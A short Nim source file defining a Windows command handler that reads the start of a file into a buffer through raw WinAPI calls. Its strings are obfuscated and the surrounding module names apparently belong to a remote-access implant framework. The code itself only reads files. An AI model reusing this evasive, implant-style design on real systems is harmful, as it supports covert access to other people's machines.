import std/json
import std/parseutils
import std/strutils
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import execution/core

proc run_preview*(args, params: string; buf: var openArray[char]): int =
  # Reads the start of a file into the buffer
  let path = args.strip()
  if path.len == 0:
    return writeErr(obf("missing path"), buf)
  var limit = 4096
  try:
    let p = parseJson(params)
    if p.hasKey(obf("size_limit")):
      var n = 0
      if parseInt(p[obf("size_limit")].getStr(), n) > 0 and n > 0:
        limit = n
  except JsonParsingError:
    discard
  if limit > buf.len:
    limit = buf.len
  var w: array[520, uint16]
  asciiWide(path, w)
  let h = createFileW(addr w[0], 0x80000000'u32, 1, nil, 3, 0x80, 0)
  if h == cast[pointer](-1):
    return writeErr(obf("cannot open file"), buf)
  defer:
    discard closeHandle(h)
  var total = 0
  while total < limit:
    var n: culong = 0
    let chunk = min(limit - total, buf.len - total)
    if chunk <= 0:
      break
    if readFile(h, addr buf[total], culong(chunk), addr n, nil) == 0 or n == 0:
      break
    total += int(n)
  total
